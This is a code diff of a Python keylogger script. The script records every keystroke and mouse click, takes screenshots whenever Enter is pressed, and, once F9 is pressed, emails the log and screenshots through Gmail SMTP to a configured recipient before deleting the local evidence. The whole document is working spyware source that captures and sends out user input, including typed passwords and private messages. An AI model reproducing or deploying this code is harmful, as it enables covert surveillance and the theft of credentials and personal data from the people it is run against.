@@ -1,189 +1,181 @@
-# My resources
-from constants import *
+# author: brownfox2k6
+# 22 February 2024
 
 # Site-packages
-from playsound import playsound
 from pynput.keyboard import Listener as Keyboard_listener, Key
 from pynput.mouse import Listener as Mouse_listener, Button
+from pyautogui import screenshot
 
 # stdlibs
 from datetime import datetime
+from email.mime.application import MIMEApplication
 from email.mime.multipart import MIMEMultipart
 from email.mime.text import MIMEText
-from os.path import join
-from pickle import load, dump
+from json import load
+from os import mkdir, listdir
+from shutil import rmtree
 from smtplib import SMTP
 from ssl import create_default_context
 
 
-def write_to_log(s: str) -> None:
-    """
-    Write encrypted data to the log file.
-    """
-    dump(fernet.encrypt(s.encode("utf-8")), log_f)
-
-
 def get_time(day=False) -> str:
-    """
-    Get local time on computer
-    """
-    format_ = "%d %b %H:%M:%S" if day else "%H:%M:%S"
-    return datetime.now().strftime(format_)
+  """
+  Get local time on computer
+  """
+  format_ = "%d %b %H:%M:%S" if day else "%H:%M:%S"
+  return datetime.now().strftime(format_)
+
+
+def get_screenshot() -> None:
+  idx = len(listdir("./s_manifest"))
+  ss = screenshot()
+  ss.save(f"./s_manifest/ss_{idx}.png")
 
 
 def keyboard_press(key: Key) -> None:
-    """
-    on_press for keyboard listener.
-    """
-    # Flag variable, when press F9, exit_ = True,
-    # terminate Keyboard listener and also terminate Mouse listener
-    global exit_
+  """
+  on_press for keyboard listener.
+  """
+  # Flag variable, when press F9, exit_ = True,
+  # terminate Keyboard listener and also terminate Mouse listener
+  global exit_
 
-    # Check if it's an alphanumeric key
+  # Check if it's an alphanumeric key
+  try:
+    # Check if it's a combination key - goes with Ctrl
     try:
-        # Check if it's a combination key - goes with Ctrl
-        try:
-            key = CHARS[CODES.index(str(key).replace("'", ""))]
-            key = f"「{key}」"
+      key = SPE_CTRL[str(key).replace("'", "")]
+      key = f"「{key}」"
 
-        # This can cause ValueError (if it's not a combination key)
-        except ValueError:
-            key = key.char
+    # This can cause ValueError (if it's not a combination key)
+    except KeyError:
+      key = key.char
 
-    # This can cause AttributeError (if it's a special key)
-    except AttributeError:
+  # This can cause AttributeError (if it's a special key)
+  except AttributeError:
 
-        # Press F9 -> send mail AND terminate keylogger
-        if key == Key.f9:
-            write_to_log(f"\n\n「Keylogger terminated {get_time(day=True)}」")
-            exit_ = True
-            send_mail()
-            return False
+    # Press F9 -> send mail AND terminate keylogger
+    if key == Key.f9:
+      log_f.write(f"\n\n「Keylogger terminated {get_time(day=True)}」")
+      exit_ = True
+      send_mail()
+      return False
 
-        # Enter -> create new line in log file + get time
-        elif key == Key.enter:
-            key = f"\n「••   {get_time(day=True)}」 "
+    # Enter -> create new line in log file + get time
+    elif key == Key.enter:
+      get_screenshot()
+      key = f"\n「••   {get_time(day=True)}」 "
 
+    # For aesthetic
+    elif key == Key.backspace:
+      key = "「«×」"
+    elif key == Key.delete:
+      key = "「×»」"
+    elif key == Key.space:
+      key = "「_」"
+
+    else:
         # For aesthetic
-        elif key == Key.backspace:
-            key = "「«×」"
-        elif key == Key.delete:
-            key = "「×»」"
-        elif key == Key.space:
-            key = "「_」"
+      key = str(key).replace("Key.", "")\
+            .replace("_l", "").replace("_r", "").replace("_gr", "")
+      if key == "shift":
+        key = "↑"
+      key = f"「{key}」"
 
-        else:
-            # For aesthetic
-            key = str(key).replace("Key.", "")\
-                  .replace("_l", "").replace("_r", "").replace("_gr", "")
-            if key == "shift":
-                key = "↑"
-            key = f"「{key}」"
-
-    write_to_log(key)
+  log_f.write(key)
 
 
 def mouse_click(x, y, button, pressed) -> None:
-    """
-    on_click for mouse listener.
-    """
-    if exit_:
-        return False
-    if pressed:
-        if button == Button.left:
-            button = "L"
-        else:
-            button = "R" if (button == Button.right) else "M"
+  """
+  on_click for mouse listener.
+  """
+  if exit_:
+    return False
+  if pressed:
+    if button == Button.left:
+      button = 'L'
+    elif button == Button.right:
+      button = 'R'
+    else:
+      button = 'M'
 
-        # Max dim: eg.1920, 1080 -> Each of them has 4 digits
-        # :>4d: Right aligned text with width=4
-        write_to_log(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")
+    # :>4d: Right aligned text with width=4
+    log_f.write(f"\n「{x :>4d} {y :>4d} {button} {get_time()}」 ")
 
 
 def send_mail() -> None:
-    """
-    Send keylogger data through Gmail.
-    """
-    try:
-        # Change the position to the start of file
-        log_f.seek(0)
+  """
+  Send keylogger data through Gmail.
+  """
+  try:
+    print("Reading log file")
+    log_f.seek(0)
+    body = log_f.read()
+    body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
+    body = f'<font size="4" face="Cascadia Mono">{body}</font>'
 
-        # Read beyond end of the log file
-        try:
-            body = ""
-            while True:
-                # Decrypt the log file
-                body += fernet.decrypt(load(log_f)).decode()
+    print("Initialize and login gmail server")
+    server = SMTP(host="smtp.gmail.com", port=587)
+    server.ehlo()
+    server.starttls(context=create_default_context())
+    server.ehlo()
+    server.login(user=SENDER, password=SMTP_PASSWORD)
 
-        # After reached EOF, embed it into a HTML template
-        except EOFError:
-            # New line character in HTML is the `<br>` tag,
-            # space character in HTML is `&nbsp;`
-            body = body.replace("\n", "<br>").replace(" ", "&nbsp;")
+    print("Initializing message")
+    message = MIMEMultipart()
+    message["Subject"] = f"Keylogger {get_time(day=True)}"
+    message["From"] = SENDER
+    message["To"] = RECIPIENT
+    message.attach(MIMEText(body, "html", "utf-8"))
 
-            # Change font size and font face
-            body = f'<font size="{FONT_SZ}" face="{FONT_FACE}">{body}</font>'
+    print("Attaching screenshots")
+    for f in listdir("./s_manifest"):
+      if not f.endswith(".png"):
+        continue
+      with open(f"./s_manifest/{f}", "rb") as ipath:
+        p = MIMEApplication(ipath.read(), _subtype="png")
+        p.add_header("Content-Disposition", f"attachment; filename={f}")
+        message.attach(p)
 
-        # Initialize and login gmail server
-        server = SMTP(host="smtp.gmail.com", port=587)
-        server.ehlo()
-        server.starttls(context=create_default_context())
-        server.ehlo()
-        server.login(user=SENDER, password=SMTP_PASSWORD)
+    print("Sending email")
+    server.send_message(message)
+    server.quit()
+    print("Email sent successfully")
 
-        # Initialize message
-        message = MIMEMultipart()
-        message["Subject"] = f"Keylogger {get_time(day=True)}"
-        message["From"] = SENDER
-        message["To"] = RECIPIENT
-        message.attach(MIMEText(body, "html", "utf-8"))
+    # Delete everything that have just been sent
+    log_f.close()
+    rmtree("./s_manifest", ignore_errors=True)
 
-        # Send message and log out
-        server.send_message(message)
-        server.quit()
-
-        # After sending the mail successfully,
-        # delete all data in the log file and close it
-        log_f.truncate(0)
-        log_f.close()
-
-    # Play a sound if exists any error
-    except:
-        playsound(FAIL_SOUND)
+  except Exception as err:
+    print("Failed to sent email")
+    print(err)
 
 
 if __name__ == "__main__":
-    # When goes with Ctrl, CHARS[i] is written as CODES[i] (0 <= i <= 35),
-    # since the English alphabet has 26 letters from A to Z
-    # and 10 digits from 0 to 9, so total is 36 chars
-    CHARS = ("A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K",
-             "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "V",
-             "W", "X", "Y", "Z", "0", "1", "2", "3", "4", "5", "6",
-             "7", "8", "9"
-    )
-    CODES = (r"\x01", r"\x02", r"\x03", r"\x04", r"\x05", r"\x06",
-             r"\x07", r"\x08", r"\t", r"\n", r"\x0b", r"\x0c",
-             r"\r", r"\x0e", r"\x0f", r"\x10", r"\x11", r"\x12",
-             r"\x13", r"\x14", r"\x15", r"\x16", r"\x17", r"\x18",
-             r"\x19", r"\x1a", "<48>", "<49>", "<50>", "<51>",
-             "<52>", "<53>", "<54>", "<55>", "<56>", "<57>"
-    )
+  SPE_CTRL = {'A': '\\x01', 'B': '\\x02', 'C': '\\x03', 'D': '\\x04', 'E': '\\x05', 'F': '\\x06', 'G': '\\x07', 'H': '\\x08', 'I': '\\t', 'J': '\\n', 'K': '\\x0b', 'L': '\\x0c', 'M': '\\r', 'N': '\\x0e', 'O': '\\x0f', 'P': '\\x10', 'Q': '\\x11', 'R': '\\x12', 'S': '\\x13', 'T': '\\x14', 'U': '\\x15', 'V': '\\x16', 'W': '\\x17', 'X': '\\x18', 'Y': '\\x19', 'Z': '\\x1a', '0': '<48>', '1': '<49>', '2': '<50>', '3': '<51>', '4': '<52>', '5': '<53>', '6': '<54>', '7': '<55>', '8': '<56>', '9': '<57>'}
 
-    # Initialization
-    with open("key.pkl", "rb") as key_file:
-        fernet = load(key_file)
-    exit_ = False
-    log_f = open(join(HIDE_DIR, LOG_FILE), "ab+")
-    write_to_log(f"\n\n「Keylogger started {get_time(day=True)}」\n")
+  # Initialization
+  try:
+    mkdir("./s_manifest")
+  except FileExistsError:
+    pass
+  exit_ = False
+  log_f = open("./s_manifest/log.txt", mode="a+", encoding="utf-8")
+  log_f.write(f"\n\n「Keylogger started {get_time(day=True)}」\n")
+  with open("conf.json") as f:
+    data = load(f)
+    SENDER = data["sender"]
+    SMTP_PASSWORD = data["smtp_password"]
+    RECIPIENT = data["recipient"]
 
-    # Create threads
-    keyboard = Keyboard_listener(on_press=keyboard_press)
-    mouse = Mouse_listener(on_click=mouse_click)
+  # Create threads
+  keyboard = Keyboard_listener(on_press=keyboard_press)
+  mouse = Mouse_listener(on_click=mouse_click)
 
-    # Start both threads
-    keyboard.start()
-    mouse.start()
+  # Start both threads
+  keyboard.start()
+  mouse.start()
 
-    # Wait until both threads are completely executed
-    keyboard.join()
-    mouse.join()
+  # Wait until both threads are completely executed
+  keyboard.join()
+  mouse.join()
